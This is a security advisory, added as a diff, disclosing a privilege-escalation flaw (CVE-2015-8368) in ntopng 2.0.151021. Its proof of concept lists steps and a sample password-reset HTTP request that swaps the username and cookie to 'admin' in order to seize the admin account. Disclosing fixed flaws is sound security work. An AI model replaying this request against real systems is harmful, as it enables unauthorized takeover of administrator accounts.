@@ -1,0 +1,24 @@
+# Vulnerability title: ntop-ng <= 2.0.151021 - Privilege Escalation
+# Author: Dolev Farhi
+# Contact: dolev at flaresec.com
+# Vulnerable version: 2.0.151021
+# Fixed version: 2.2
+# Link: ntop.org
+# Date 27.11.2015
+# CVE-2015-8368
+
+# Product Details:
+ntopng is the next generation version of the original ntop, a network traffic probe that shows the network usage, similar to what the popular top Unix command does. ntopng is based on libpcap and it has been written in a portable way in order to virtually run on every Unix platform, MacOSX and on Windows as well.
+
+# Vulnerability Details:
+in the latest stable release of ntop-ng it is possible to escalate the privileges of a non-privileged user to the admin account by resetting the password, intercepting the request and replacing the HTTP parameters.
+
+# Vulnerability Proof of concept
+1. Login with an unprivileged account
+2. Change the account password and intercept the request, modify  the username= and Cookie user= and change to the admin account
+Example:
+GET /lua/admin/password_reset.lua?csrf=XXXXXXXXXXXXXXXXXX&username=admin&old_password=12345&new_password=123456&confirm_new_password=123456 HTTP/1.1
+Cookie: user=admin; session=XXXXXXXXXXXXXXXXXXXXXXXXX
+3. Login with the admin account and the password you defined in step #3.
+
+Voila! you're an administrator.
